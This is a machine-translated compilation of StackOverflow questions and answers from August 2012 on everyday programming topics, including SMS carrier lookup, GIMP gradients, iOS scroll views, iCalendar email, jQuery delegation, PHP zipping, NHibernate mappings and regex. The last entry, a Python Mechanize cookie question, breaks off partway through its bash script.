# StackOverflow 问答 12146000-12146999

# api - 是否可以通过手机或电话号码识别电信提供商？

> ID：12146001
> 
> 赞同：0
> 
> 时间：2012-08-27T16:39:35.433
> 
> 标签：api, sms, restful-url, telecommunication

有无限的在线群发短信提供商支持 Restful API。我主要研究不同国家的 Nexmo、Tropo、Twilio 定价。

让我们以短信到巴西为例。

[特罗普]

```
2¢ / msg 
```

[ 尼克斯莫 ]

```
3.63¢ / msg 
```

[ Twilio ] Twilo 提供基于提供商的服务。见定价。

```
Vivo    8.3¢ / msg
Claro   8.6¢ / msg
TIM     1.2¢ / msg
Oi      8.3¢ / msg 
```

所以，我想要的是在发送短信之前，我想识别提供者。**请参阅在 Twilio 中向TIM**发送短信的示例更便宜，但其他 Tropo 和 Nexmo 更便宜。如果有办法识别电信提供商，那么我可以在发送短信之前编程使用哪个 API。我不知道这个问题是否应该在这里发布。有没有办法或 api 可以识别这个？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T19:56:02.833

我没有看到现成的解决方案，除了帐单中的数据库（在大多数情况下，它们会根据具体需求进行详细说明）

“第一”来源是国际电联。链接到文档 - [http://www.itu.int/oth/T0202.aspx?parent=T0202](http://www.itu.int/oth/T0202.aspx?parent=T0202) 这是官方来源，但还没有准备好使用数据库。您必须花费大量时间手动创建数据库。

有一些预解析的数据库，如[http://en.allworldsms.com/html/phone_codes.php](http://en.allworldsms.com/html/phone_codes.php) ...它很丑，但它包含徽标。它不能在一个文件中下载，但仍然很容易使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T16:10:57.603

[如果您想使用他们拥有的基于 Web 的面板， http://www.data24-7.com/git.php](http://www.data24-7.com/git.php)提供免费查找服务。如果您想要 API 访问，他们每次查找都会收取亚美分的费用。当我使用它时，汇率大约是 0.006 美分。此外，数据只有大约 90% 的正确率。从那时起，他们可能已经对其进行了改进。

您可以获得的不仅仅是提供商，您还可以判断电话号码是否支持 SMS、是否是无线的以及问候中断音是什么（绕过语音邮件问候的号码）。

# png - Gimp - 创建背景渐变

> ID：12146002
> 
> 赞同：0
> 
> 时间：2012-08-27T16:39:38.560
> 
> 标签：png, background-image, gimp, gradient

我的页面上有以下用于 Web 渐变的 css 代码，我想使用 Gimp 制作与此渐变完全一致的背景图像。任何人都有这方面的专业知识，可以提供一些建议吗？谢谢

```
background-image:-webkit-linear-gradient(90deg, rgba(51, 51, 51, 1.00) 0.0% , rgba(26, 26, 26, 1.00) 50.5% , rgba(51, 51, 51, 1.00) 50.7% , rgba(77, 77, 77, 1.00) 100.0% ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T19:13:24.290

这些 rgba 颜色对应于以下 html-notations ：

```
rgba(51, 51, 51, 1.00) - #333333 (Color A)

rgba(26, 26, 26, 1.00) - #1a1a1a (Color B)

rgba(51, 51, 51, 1.00) - #333333 (Color A)

rgba(77, 77, 77, 1.00) - #4d4d4d (Color C) 
```

您可以尝试创建一个矩形图像（高度是宽度的两倍）。用颜色 A 到颜色 B 的渐变填充上半部分，用颜色 A 到颜色 C 的渐变填充下半部分。然后将其设置为启用“重复”属性的背景图像。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T19:50:34.967

GIMP 不能直接解析它，尽管 GIMP 2.8 附带了一个 Python 脚本，可以输出这种 CSS 语法中的渐变

您可以制作一个 python 脚本来将 CSS 渐变语法解析为 GIMP 渐变，然后他们在图像上使用此渐变。

当然，如果您只需要一次，那就大材小用了——我建议在 GIMP 中创建一个新的渐变，然后手动编辑记录的文件（如果您在 *nix 上，则在 ~/.gimp-2.8/gradients 文件夹中，否则检查对于首选项中的用户渐变文件夹）。

GIMP 的渐变文件很简单——一个纯文本文件，如下所示：

```
GIMP Gradient
Name: Untitled
2
0.000000 0.243464 0.486928 0.000000 0.000000 0.000000 1.000000 0.000000 1.000000 0.000000 1.000000 0 0 0 0
0.486928 0.743464 1.000000 0.000000 0.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 0 0 0 0 
```

所以这是一个单一的渐变，有两段 - 每条线都有起点、每段的终点、起始 ARGB 颜色、结束 ARGB 颜色，以及......不要在意，只需将四个零保留在end：它们很可能用于描述每个端点的颜色类型，我们想要 0。

# ios - 在 UIScrollview 中处理触摸

> ID：12146004
> 
> 赞同：1
> 
> 时间：2012-08-27T16:39:49.043
> 
> 标签：ios, xcode, uiscrollview, scrollview

我有一个包含 UIScrollView 的视图。UIScrollView 包含一个 UIImageView （现在只有一个，但以后会有更多）。我希望能够将 UIImageView 拖出 UIScrollView 并进入超级视图。

我已经查看了我可以在网上找到的所有类似问题和示例，但仍然无法理解它是如何工作的。

起初我无法在滚动视图中注册所有内容。经过大量搜索，我找到了一种让touchesbegin注册的方法，如下所示：

首先，我创建了一个基于视图的新项目，并在自动创建的“ViewController.h”中创建了一个名为滑块的 IBOutlet。

然后在自动创建的“ViewController.m”中创建了 UIScrollview。

在 IB 中，我将 UIScrollView 添加到情节提要，然后将其连接到“滑块”IBOutlet。

接下来，我将类文件添加到项目中。这个新类是 os UIImageView 的子类。我将这个类命名为“DragableImage”

然后在 IB 中，我将图像放入 UIScrollview 单击它并将类更改为“DragableImage”

在 DragableImage.m 中，我开始进行无效的触摸，并简单地告诉它在单击时隐藏。

这工作并且触摸注册并使图像消失但是我现在如何将新图像添加到主视图并让它跟随我的手指？

这就是我的代码方式：

视图控制器.h

```
#import <UIKit/UIKit.h>

@interface ViewController : UIViewController {

    IBOutlet UIScrollView *slider;
}

@end 
```

视图控制器.m

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad
{
    [slider setScrollEnabled:YES];
    [slider setContentSize:CGSizeMake(306, 1560)];
    [slider setShowsVerticalScrollIndicator:NO];
    slider.canCancelContentTouches = NO; 
    slider.delaysContentTouches = NO;

    [super viewDidLoad];
    // Do any additional setup after loading the view.
}

- (BOOL)shouldAutorotateToInterfaceOrientation: (UIInterfaceOrientation)interfaceOrientation
{
    return YES;
}

@end 
```

可拖动图像.h

```
#import <UIKit/UIKit.h>

@interface DragableImage : UIImageView

@end 
```

可拖动图像.m

```
@implementation DragableImage

- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {

    self.hidden = YES;
}

@end 
```

如何使这项工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T19:25:39.780

这里可能会出现一个明显的问题。即，如何区分拖动滚动和拖动图像。我处理这个问题的方法是设置一个点击并按住手势识别器（[http://developer.apple.com/library/ios/#documentation/EventHandling/Conceptual/EventHandlingiPhoneOS/GestureRecognizers/GestureRecognizers.html](http://developer.apple.com/library/ios/#documentation/EventHandling/Conceptual/EventHandlingiPhoneOS/GestureRecognizers/GestureRecognizers.html)）。

一旦检测到保持，您就可以对其进行设置，以便将进一步的触摸/手势路由到您拖放代码。你可以在这里找到一个很好的教程： [http ://www.ancientprogramming.com/2012/04/05/drag-and-drop-between-multiple-uiviews-in-ios/](http://www.ancientprogramming.com/2012/04/05/drag-and-drop-between-multiple-uiviews-in-ios/)

# smtp - 通过 Smtp 发送 iCalendar 邀请

> ID：12146007
> 
> 赞同：3
> 
> 时间：2012-08-27T16:39:58.367
> 
> 标签：smtp, icalendar

几天来，我一直在尝试通过 smtp 发送 iCalendar 邀请。我正在使用 DDay.iCal 库来构建消息的 iCalendar 组件，并且我正在使用或多或少的本土 smtp 服务器来发送消息（不幸的是，我暂时坚持使用此解决方案）。

我已经搞砸了几种不同的方法，但我没有任何运气。结果通常是收件人收到一封带有 .ics 附件的电子邮件。在 Outlook 中，我可以打开附件并将其添加到我的日历中；gmail 只会让我下载附件。它不会将其识别为日历邀请。

下面是我尝试过的一种场景的示例。有人可以告诉我它有什么问题或需要做什么来构建正确的日历邀请消息吗？

谢谢！

```
Delivered-To: jordan_test@gmail.com
Received: by 10.68.224.234 with SMTP id rf10csp257513pbc;
    Mon, 27 Aug 2012 09:16:44 -0700 (PDT)
Received: by 10.50.85.228 with SMTP id k4mr10905189igz.22.1346084204116;
    Mon, 27 Aug 2012 09:16:44 -0700 (PDT)
Return-Path: <283877=jordan_test=gmail.com@smtp.mycompany.com>
Received: from smtp.mycompany.com ([214.16.251.150])
    by mx.google.com with SMTP id cw2si32587704icc.106.2012.08.27.09.16.43;
    Mon, 27 Aug 2012 09:16:44 -0700 (PDT)
Received-SPF: neutral (google.com: 214.16.251.150 is neither permitted nor denied by domain of 283877=jordan_test=gmail.com@smtp.mycompany.com) client-ip=215.16.251.150;
Authentication-Results: mx.google.com; spf=neutral (google.com: 215.16.251.150 is neither permitted nor denied by domain of 283877=jordan_test=gmail.com@smtp.mycompany.com) smtp.mail=283877=jordan_test=gmail.com@smtp.mycompany.com
Date: Mon, 27 Aug 2012 16:16:43 GMT
X-Mailer: BlahCommunicationsServices 1.0.0, by BLAH Inc.
Subject: =?UTF-8?B?SGV5ISB0aGlzIGlzIGZvciB5b3Uu?=
From: <ical@return.mycompany.com>
To: <jordan_test@gmail.com>
Reply-To: <ical@return.mycompany.com>
MIME-Version: 1.0
X-Priority: 3 (Normal)
Content-Type: multipart/alternative;boundary="__=_Part_Boundary_1687780707_370337274"
Message-Id: <283877@smtp.mycompany.com>
References: <283877@smtp.mycompany.com>

--__=_Part_Boundary_1687780707_370337274
Content-Transfer-Encoding: 7bit
Content-Type: text/plain

test test test

--__=_Part_Boundary_1687780707_370337274
Content-Transfer-Encoding: 7bit
Content-Type: text/calendar;method=REQUEST;charset=utf-8

BEGIN:VCALENDAR
VERSION:2.0
METHOD:PUBLISH
PRODID:-//ddaysoftware.com//NONSGML DDay.iCal 1.0//EN
BEGIN:VEVENT
ATTENDEE;CN=Jordan;ROLE=REQ-PARTICIPANT;PARTSTAT=TENTATIVE;CUTYPE=INDIVIDUAL;RSVP=TRUE:MAILTO:jordan@mycompany.com
ATTENDEE;CN=Jordan;ROLE=REQ-PARTICIPANT;PARTSTAT=TENTATIVE;CUTYPE=INDIVIDUAL;RSVP=TRUE:MAILTO:jordan_test@gmail.com
DESCRIPTION:test test test
DTEND:20120828T130000
DTSTAMP:20120827T121642
DTSTART:20120828T120000
ORGANIZER:MAILTO:ical@return.mycompany.com
SEQUENCE:0
SUMMARY:Hey! this is for you.
UID:234434
END:VEVENT
BEGIN:VTIMEZONE
END:VTIMEZONE
END:VCALENDAR

--__=_Part_Boundary_1687780707_370337274-- 
```

# jquery - 我是否通过将“on”调用绑定到更具体的东西来节省处理器时间？

> ID：12146010
> 
> 赞同：0
> 
> 时间：2012-08-27T16:40:11.610
> 
> 标签：jquery

在这里寻找最佳实践。但我最近刚刚将一个应用程序从 jQuery 1.4 升级到 1.8，我正在慢慢地将所有`live`调用切换到`on`调用。

```
$(document).on('click', 'a.edit', function(){ 
```

从 ：

```
$("a.edit").live(function() { 
```

1.  将它绑定到比文档更具体的东西会更快吗？

2.  这两个调用之间是否存在速度差异？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T16:44:27.500

现在将事件委托给文档意味着文档中的所有元素在单击时都会触发事件处理程序，然后它会检查目标是否匹配`a.edit`，这是很多检查。将其缩小到更接近的元素`a.edit`将意味着更少的元素触发事件处理程序，并且更少的元素来检查与指定目标的匹配。

来自 jQuery[文档](http://api.jquery.com/live/)：

> 不再推荐使用 .live() 方法，因为更高版本的 jQuery 提供了没有缺点的更好方法。特别是，使用 .live() 会出现以下问题：
> 
> jQuery 在调用 .live() 方法之前尝试检索选择器指定的元素，这在大型文档上可能很耗时。不支持链接方法。例如， $("a").find(".offsite, .external").live( ... ); 无效且无法按预期工作。由于所有 .live() 事件都附加在文档元素上，因此事件在处理之前会采用最长和最慢的路径。在事件处理程序中调用 event.stopPropagation() 无法停止附加在文档下方的事件处理程序；该事件已经传播到文档。.live() 方法以令人惊讶的方式与其他事件方法进行交互，例如，$(document).unbind("click") 删除了所有对 .live() 的调用附加的点击处理程序！

它基本上是这样的：

```
$(document).click(function(e) {
    if (e.target == ourElement) {
        //hey, our element was clicked and bubbled all the way to the root, 
        //so let's do something
    }else{
        //we just jumped through some hoops, but this is not the element we 
        //are looking for, so do nothing...and we do this on every click !
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T16:55:00.247

两种方法之间没有速度差异，因为它们都需要检查单击的元素是否`a.edit`存在 - 这将花费相同的时间。

但是调用检查的次数有所不同 - 如果您将侦听器附加到它，它将在**每次**点击`document`时触发。如果您以其他方式执行此操作，则更常见。

 **然而，两者之间的关键区别（无论速度如何）

```
$(document).on('click', 'a.edit', function(){ 
```

和

```
$('a.edit').on('click', function(){ 
```

是第一个将侦听器绑定到您以后可能创建`click`的所有现有和**未来元素。**第二个将侦听器**仅**绑定到现有元素。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T16:50:47.977

扩展@adeneo的答案，

```
$(document).on('click','a.edit',function(){...}); 
```

将事件处理程序附加到文档。因为`document`是 DOM 的根，所以每个事件最终都会冒泡，`document`除非传播过程中的某个点停止。

在您的示例中，这意味着每次单击都会触发您的事件处理程序。然后，处理程序将检查`event.target`单击的来源是否与提供的选择器匹配（在本例中为`a.edit`）。考虑`click`是网页上发生的最常见事件之一，如果不是最常见的事件，那么这里将进行大量处理。

委派事件时的最佳实践是在您使用事件处理程序定位的元素中选择最接近的共同祖先（显然，该元素也必须在运行时存在，以便处理程序可以通过 jQuery 附加）。这将最大限度地减少不必要地触发事件处理程序的次数，并确保通过一次调用捕获所有目标元素`.on`**

# javascript - 为什么在 for...in 循环中没有出现`undefined`？

> ID：12146013
> 
> 赞同：4
> 
> 时间：2012-08-27T16:40:20.337
> 
> 标签：javascript, properties

我对`for`-`in`循环有点困惑：

```
window.hasOwnProperty(undefined) // Returns true 
```

和

```
undefined in window // Returns true 
```

但以下内容*不*打印`Undefined is in window!`

```
for(a in window) {
     if(a === 'undefined')
         console.log('Undefined is in window!');
} 
```

为什么没有`undefined`出现在`for`-`in`循环中？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-27T16:41:13.707

它不是可枚举的属性。在现代 JavaScript 引擎中，您可以在自己的对象中控制它，但几乎总是这样（可能不是在每个解释器中）“原生”对象可以从`for ... in`迭代中“隐藏”属性。

`Object.defineProperty()`你可以在[MDN](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/defineProperty)上阅读。我不确定是否会有语法（在 Harmony 中）用于在对象文字中将属性标记为不可枚举。

# xstream - 如何将特定字段添加到由 xstream 映射的输出 xml

> ID：12146014
> 
> 赞同：1
> 
> 时间：2012-08-27T16:40:49.120
> 
> 标签：xstream, oxm

我有一个要映射到 XML 的 POJO。我为此使用 XStream。

例如：

```
class employee{
String name;
String age;
} 
```

和相应的 XML 将是，

```
<employees>
  <employee>
    <name></name>
    <age></age>
  </employee>
  <employee>
    <name></name>
    <age></age>
  </employee>
  <employee>
    <name></name>
    <age></age>
  </employee>
<employees> 
```

但我的要求是在开始时只有一次日期字段和员工列表。像这样，

```
<employees>
  **<date>10/12/2015</date>**
  <employee>
    <name></name>
    <age></age>
  </employee>
  <employee>
    <name></name>
    <age></age>
  </employee>
  <employee>
    <name></name>
    <age></age>
  </employee>
<employees> 
```

如何将不同的元素添加到 XStream 生成的 XML 中。我尝试过使用带有日期和员工名单的 POJO。日期像这样被打印了好几次，

```
<employees>
  **<date>10/12/2015</date>**
  <employee>
    <name></name>
    <age></age>
  </employee>
  **<date>10/12/2015</date>**
  <employee>
    <name></name>
    <age></age>
  </employee>
  **<date>10/12/2015</date>**
  <employee>
    <name></name>
    <age></age>
  </employee>
<employees> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T10:57:44.227

通常我会创建一个容器类来解决这个问题。

IE：

```
@XStreamAlias("employees")
public class EmployeeList {

  @XStreamAlias("date")
  private Date date;

  @XStreamImplicit
  private List<Employee> employees;
} 
```

# php - 文件夹中的 PHP Zip 文件 - 没有错误 - 没有存档

> ID：12146016
> 
> 赞同：0
> 
> 时间：2012-08-27T16:40:58.000
> 
> 标签：php

我对 PHP 5.2x 和“ZipArchive”越来越疯狂，以下代码不会抛出错误，每个部分都返回 true，但没有创建 ZIP 文件。

有人可以看到我没有看到的错误吗？

```
if ($handle = opendir($directory)) {
        $zip = new ZipArchive();

        $filename = time() . '.zip';
        $path = APPLICATION_PATH . '/../download/';

        $status = $zip->open($path . $filename, ZIPARCHIVE::CREATE);

        if ($status !== true) {
            $this->log->err('Cant create zipArchive!');
            return false;
        } 

        while (false !== ($file = readdir($handle))) {
            if (!is_dir($file)) {
                if (is_readable($file)) {
                    if (!$zip->addFile($file)) {
                        $this->log->err('Cant add File to archive: ' . $file);
                    }
                } else {
                     $this->log->debug('Added file to archive: ' . $file);
                }
            }
        }

        closedir($handle);

        if (!$zip->close()) {
            $error = $zip->getStatusString();
            $this->log->err($error); 
            $this->log->err('Cant create archive..');
        } 
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T16:59:11.640

您实际上从未在 ZIP 存档中添加任何文件。这是您没有错误的唯一原因。

`is_readable($file)`总是 return `false`，当它`Added file to archive ...`打印出来时，可能是因为你放错了你的`else`块。

您必须将文件夹添加到`$file`，在您的情况下它应该是`$directory`：

```
while (false !== ($file = readdir($handle))) {
    if (!is_dir($directory . $file)) {
        if (is_readable($directory . $file)) {
           if (!$zip->addFile($directory . $file)) {
                $this->log->err('Cant add File to archive: ' . $file);
            } else {
                $this->log->debug('Added file to archive: ' . $file);
            }
        } else {
            $this->log->debug('File not readable: ' . $file);
        }
    }
} 
```

# c# - 如何在 NHibernate 中同时创建父级并向其添加子级？

> ID：12146021
> 
> 赞同：2
> 
> 时间：2012-08-27T16:41:36.140
> 
> 标签：c#, nhibernate

当我尝试创建一个集合并同时向它添加一个类别时，我不断得到一个空引用。我忘了什么吗？还是我做错了？

```
private static void SamepleMethod(ICollectionRepository collectionRepo)
    {
        Collection collection = new Collection { CollectionName = "Collection" };

        Category category = new Category { Collection = collection, CategoryName = "Category" };

        category.SetCollection(collection);
        collection.AddCategory(category);

        collectionRepo.Save(collection);
    } 
```

收藏：

```
public class Collection
{
    public virtual int? Id { get; set; }
    public virtual string CollectionName { get; set; }
    public virtual ICollection<Category> Categories { get; set; }

    public virtual void AddCategory(Category category)
    {
        Categories.Add(category);
        category.Collection = this;
    }
} 
```

类别：

```
public class Category
{
    public virtual int? Id { get; set; }
    public virtual string CategoryName { get; set; }
    public virtual Collection Collection { get; set; }

    public virtual void SetCollection(Collection collection)
    {
        Collection = collection;
        collection.Categories.Add(this);
    }
} 
```

集合.hbm.xml

```
<?xml version="1.0" encoding="utf-8" ?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2"
               namespace="ACME.Model"
               assembly="ACME.Model">

<class name="Collection" table="Collections" >

<id name="Id" column="CollectionId" type="int" >
  <generator class="identity" />
</id>

<set name="Categories" inverse="true" cascade="all">
  <key column="CollectionId" />
  <one-to-many class="Category"></one-to-many>
</set>

<property name="CollectionName">
  <column name="CollectionName" sql-type="nvarchar(50)" />
</property> 
```

类别.hbm.xml

```
<?xml version="1.0" encoding="utf-8" ?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2"
               namespace="ACME.Model"
               assembly="ACME.Model">

<class name="Category" table="Categories" >

<id name="Id" column="CategoryId" type="int" >
  <generator class="identity" />
</id>

<many-to-one name="Collection"
             class="Collection"
             column="CollectionId"
             not-null="true" />

<property name="CategoryName">
  <column name="CategoryName" sql-type="nvarchar(50)" />
</property> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T19:45:41.403

您从未`Categories`在您的类中初始化该属性`Collection`，因此它保持其默认值 null ...
您可能希望将其初始化为构造函数中的新集合。

此外，我计算了至少 3 个不同的代码行，您可以在其中将类别与集合相关联。
我相信一次就足够了 :) （我最喜欢它的`AddCategory`方法，或者 ctor 的 ctor `Category`）。

另一件小事——hbm 映射文件已成为过去；如今，在代码中映射更加方便（并且不易出错）。
您可以使用旧的扩展[fluent nHibernate](http://www.fluentnhibernate.org/)或新的官方[mapping-by-code](http://notherdev.blogspot.co.il/2012/02/nhibernates-mapping-by-code-summary.html)来做到这一点，这也非常好，但是缺乏文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T20:03:27.363

（正如 sJhonny 指出的那样）：确保初始化 Categories 集合

除此之外，我在您的代码中看到了其他问题（与您的问题无关）：

只初始化两个引用（从 Collection 到 Category，反之亦然）一次。

您的代码可以：

```
 // set category.Collection
 Category category = new Category { Collection = collection ...
 // set collection agin
 category.SetCollection(collection);
     // within SetCollection, you add the category
     collection.Categories.Add(this);
 // and add the category agin
 collection.AddCategory(category); 
```

看起来该类别可以放在多个集合中，这些集合可以有多个类别。如果是这种情况，您应该将它们映射为`many-to-many`. 如果它实际上是正确的，请不要介意。

除非您正在做一些特殊的事情，否则您不应该使用 sql-type。只需像这样映射一个字符串：

```
<property name="CategoryName" column="CategoryName" length="50" /> 
```

不鼓励使用身份主键，因为它会给您带来糟糕的性能。

# css - 在浮动动态生成的元素（bx 滑块）上无法识别悬停

> ID：12146022
> 
> 赞同：0
> 
> 时间：2012-08-27T16:41:37.963
> 
> 标签：css, hover, css-float, dynamically-generated, bxslider

我正在使用 bx Slider，对上一张和下一张幻灯片使用外部控件。一切正常。但是，我正在为控件使用浮动元素，因为我希望它们排成一行并填充整个包含 div （如在这个问题[CSS 三个内联元素中，从左到右对齐，如何占据所有可用宽度](https://stackoverflow.com/questions/12142980/css-three-inline-elements-with-align-from-left-to-right-how-to-occupy-all-avail)）

但是，控件是由 bxSlider 动态生成的，并且由于某些奇怪的原因，如果元素是浮动的，则无法识别悬停

这是一个示例页面：[http ://demitogroup.comuv.com/d_store/copia.html](http://demitogroup.comuv.com/d_store/copia.html)

如果我用萤火虫关闭浮动到#external_promo_controls div 悬停再次被识别。

如果链接不是动态生成的，则不会出现问题。

在 Chrome 上也会发生同样的情况。

我完全不知道发生了什么。

可以尝试找出避免使用浮动元素的方法，但随后我将再次回到我的第一个问题......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T16:46:45.067

如果您希望您的浮动元素填充整个空间，请尝试将其设置为 display:block 显式，如果它还没有。如果这不起作用，请尝试在其上设置一个大的 z-index 以确保没有任何隐藏的东西超出它。

# vb.net - 两个图像之间的图像识别 vb.net Lockbits

> ID：12146032
> 
> 赞同：1
> 
> 时间：2012-08-27T16:42:25.960
> 
> 标签：vb.net, image-processing, automation, lockbits

我正在使用 Pixel 在大图像和小图像之间进行搜索。我让那个成功工作，但在让 lockbits 版本做我想做的事情时遇到了麻烦。

拳头我想遍历大图像，在其中找到较小图像的第一个像素。然后一旦找到第一个像素来做一个数学方程，告诉我它得到了多少准确率。这样做时，如果它符合将我的鼠标移动到屏幕上大图像内那个小图像的第一个像素（最左上角）的那个位置的标准。与 GetPixel 格式相比，它的成功率很高，而且速度极快。

问题无法在大图像上获取小图像的起始像素所在的位置并将鼠标移动到该位置。下面是代码：

```
 Try
        Dim ifnd As Boolean = False
        Dim PreviousX As Integer
        Dim PreviousY As Integer
        PreviousX = MousePosition.X
        PreviousY = MousePosition.Y
        Dim MatchCount As Integer = 0

        Dim oX As Integer = 0
        Dim oi As Integer = 0
        Dim iX As Integer = 0
        Dim iY As Integer = 0
        Dim bmp_original As Bitmap
        Dim ImG As Bitmap
        ImG = PictureBox2.BackgroundImage
        bmp_original = ImG
        Dim bmp_large As Bitmap
        Dim SmG As Image
        SmG = PictureBox1.BackgroundImage
        bmp_large = SmG
        Dim bmg As Bitmap
        'large image
        ImG = BBt
        'small image
        bmg = Abt
        Thread.Sleep(1000)
        'large image
        If BBt Is Nothing Then
            Dim xbit As Bitmap = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)

            Dim g As Graphics = Graphics.FromImage(xbit)
            BBt = xbit
            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
            g.Dispose()
            Thread.Sleep(2000)
        End If

        'small image
        PictureBox5.BackgroundImage = Abt
        'large image
        PictureBox6.BackgroundImage = BBt
        'For value As Integer = 0 To 5
        'For value As Integer = 10 To 0 Step -2
        Thread.Sleep(1000)
        'original image
        Dim oRect As New Rectangle(0, 0, bmg.Width, bmg.Height)
        Dim oBmpData As BitmapData = bmg.LockBits(oRect, ImageLockMode.ReadWrite, System.Drawing.Imaging.PixelFormat.Format24bppRgb)
        Dim oPtr As IntPtr = oBmpData.Scan0
        Dim oPixels(99) As Integer
        Dim oMaxPix As Integer = bmg.Width + bmg.Height
        Marshal.Copy(oPtr, oPixels, 0, oMaxPix)
        Dim smWidth As Integer
        smWidth = bmg.Width - 1
        'small image
        PictureBox3.BackgroundImage = bmg
        'large image
        Dim lRect As Rectangle = New Rectangle(0, 0, bmp_large.Width, bmp_large.Height)
        Dim lBmpData As BitmapData = ImG.LockBits(lRect, ImageLockMode.ReadWrite, System.Drawing.Imaging.PixelFormat.Format24bppRgb)
        Dim lPtr As IntPtr = lBmpData.Scan0
        Dim PixelCount As Integer = ImG.Width * ImG.Height
        Dim lPixels(PixelCount - 1) As Integer
        Marshal.Copy(lPtr, lPixels, 0, PixelCount)
        'large image
        PictureBox4.BackgroundImage = ImG

        Dim MathScore As Integer
        Dim MaxScore As Integer = bmg.Height

        'beginning of Marshal Loop
        For i As Integer = 0 To lPixels.GetUpperBound(0)

            If oPixels(0) = lPixels(i) Then
                'we have a match for top left pixel - so compare the other pixels
                Dim PixelsToLeft As Integer = (i Mod ImG.Width) - 1 'pixels to left of 10by10 section of large image
                Dim PixelsToRight As Integer = ImG.Width - PixelsToLeft - smWidth 'pixels to right of 10by10 section of large image
                Dim d As Integer = PixelsToLeft + PixelsToRight 'array distance between right edge of 10by10 section and left edge of next row

                For y As Integer = 0 To 9
                    For x As Integer = 0 To 9
                        Dim oIndex As Integer = (y * 10) + x
                        Dim lIndex As Integer = (i + (y * (d + smWidth))) + x
                        If oPixels(oIndex) = lPixels(lIndex) Then
                            MathScore = MathScore + 1
                            xx = oPixels(0) + 2
                            yy = lPixels(i) + 3
                            SetCursorPos(xx, yy)
                        End If

                    Next

                Next
                If MathScore >= Val(MaxScore / 2.5) Then
                    SetCursorPos(xx, yy)
                    Dim percent As String
                    Dim myDec As Decimal
                    'inttemp = (intData2 * 100) / intData1
                    myDec = Val((MathScore * 100) / MaxScore)
                    myDec = FormatNumber(myDec, 0)
                    percent = myDec & "%"
                    Label16.Text = "Match Score: " & percent
                    Label17.Text = "Math Score: " & MathScore & " out of " & MaxScore
                    Me.ToolStripStatusLabel2.Text = "Completed"
                    Me.Button4.Enabled = True
                    GoTo Foundit
                End If
            End If
        Next
        PictureBox1.Image = (Abt)
        PictureBox2.Image = (BBt)
        ImG.UnlockBits(oBmpData)
        bmg.UnlockBits(lBmpData) 
```

发现： mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) Catch End Try

现在，如果我能弄清楚如何让鼠标在屏幕上移动，那么我就会明白了。不幸的是，我已经为此工作了几天，但没有任何成功。如果您能提供帮助，我将不胜感激。先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-19T15:22:56.097

移动鼠标执行此操作

```
dim a as new point 
a.x = "the number you want"
a.y = "the number you want"
windows.forms.cursor.position = a 
```

# php - Match either one slash or two brackets on the beginning of a string

> ID：12146035
> 
> 赞同：0
> 
> 时间：2012-08-27T16:42:38.030
> 
> 标签：php, regex

I seem to have hit my regex knowledge limit and my google-fu is failing me.

I try to not-match strings, with `preg_match` that either start with one or more slashes or (and there it gets tricky for me) with ((

My original which was used to just match / looked like that:

```
\^[^\/].*$\ 
```

And it worked beautifully. However when I try to match two brackets on the beginning of the string I fail. I would post all my approaches I tried but I don't think adding them will clarify.

Best I could do was simply adding the bracket into the character class which kind of works but already with one bracket:

```
\^[^\/(].*$\ 
```

**Examples:**

String: Hello

Desired result: Match

String: /Hello

Desired result: No Match

String: //Hello

Desired result: No Match

String: (Hello

Desired result: Match

String: ((Hello

Desired result: No Match

I really hope you could give me a push into the right direction.

Thanks

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T16:53:14.353

Well, it's possible to build the pattern exactly the way you seem to look for with lookaheads:

```
 $testStrings = array(
    'Hello', '/Hello', '//Hello', '(Hello', '((Hello'
  );

  foreach ($testStrings as $test) {
    echo $test . ' is ' .  
      ( preg_match('#^(?!/{1,2})(?!\(\()#', $test ) ? ' matched' : 'not matched ' ) 
      . '<br/>';
  }
  /** prints...
Hello is matched
/Hello is not matched
//Hello is not matched
(Hello is matched
((Hello is not matched 
  */ 
```

The point is that you 'neg-check' for two cases - either one or two forslashes OR at least two parenthesis - right after the string beginning anchor.

I don't know, though, what should be done with '///Hello' and '(((Hello' strings, whether you intend them to not-match as well - or not.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T16:47:33.173

Check this:

```
\^[^/(]{2}.*$\ 
```

maybe?

# python - 我如何使用 Mechanize 接受和发送 cookie？

> ID：12146041
> 
> 赞同：1
> 
> 时间：2012-08-27T16:42:53.407
> 
> 标签：python, bash, cookies, mechanize, wget

我有一个 bash 脚本，它使用 cookie 登录并从 URL 保存文本文件。我需要在 Python 中使用 Mechanize 实现同样的功能，但我无法让它工作。这只是两行 bash，它让我发疯。我查看了 Mechanize 文档，但不知道该怎么做。

```
#!/bin/sh
base_url=https://myapp.url.com
sign_on_request="aK8Rj_mrVk3J-PDf9x6...LONG KEY...4ZPMd0w"
# Login
